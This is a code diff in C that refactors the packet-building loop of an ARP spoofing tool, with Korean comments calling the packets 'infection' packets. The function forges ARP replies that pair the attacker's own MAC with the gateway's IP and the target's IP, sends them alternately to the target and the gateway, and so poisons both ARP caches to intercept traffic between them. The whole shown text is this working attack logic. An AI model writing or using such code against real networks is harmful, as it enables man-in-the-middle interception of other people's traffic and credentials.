@@ -20,10 +20,19 @@ void *thread_infect(void *arg) //감염패킷킷
             sw = 1;
 
         if (sw == 1)
+        {
             memcpy(infect->eth_dst_mac, infect_addr_save->save_target_mac, 6);
-
+            infect->arp_sender_ip = infect_addr_save->save_gateway_ip;
+            memcpy(infect->arp_target_mac, infect_addr_save->save_target_mac, 6);
+            infect->arp_target_ip = infect_addr_save->save_target_ip;
+        }
         else
+        {
             memcpy(infect->eth_dst_mac, infect_addr_save->save_gateway_mac, 6);
+            infect->arp_sender_ip = infect_addr_save->save_target_ip;
+            memcpy(infect->arp_target_mac, infect_addr_save->save_gateway_mac, 6);
+            infect->arp_target_ip = infect_addr_save->save_gateway_ip;
+        }
 
         memcpy(infect->eth_src_mac, mymac, 6);
         infect->type = ntohs(0x0806);          // ARP 0x0806
@@ -32,22 +41,7 @@ void *thread_infect(void *arg) //감염패킷킷
         infect->hd_size = 0x06;                // Hardware size 6 , Protocol size 4
         infect->protocol_size = 0x04;          //
         infect->opcode = ntohs(0x0002);        // OPcode 1 = request ,2 = reply
-
         memcpy(infect->arp_sender_mac, mymac, 6);
-        if (sw == 1)
-            infect->arp_sender_ip = infect_addr_save->save_gateway_ip;
-        else
-            infect->arp_sender_ip = infect_addr_save->save_target_ip;
-
-        if (sw == 1)
-            memcpy(infect->arp_target_mac, infect_addr_save->save_target_mac, 6);
-        else
-            memcpy(infect->arp_target_mac, infect_addr_save->save_gateway_mac, 6);
-
-        if (sw == 1)
-            infect->arp_target_ip = infect_addr_save->save_target_ip;
-        else
-            infect->arp_target_ip = infect_addr_save->save_gateway_ip;
 
         int res = pcap_sendpacket(pcap_handle, pkt, sizeof(pkt));
         sw += 1;
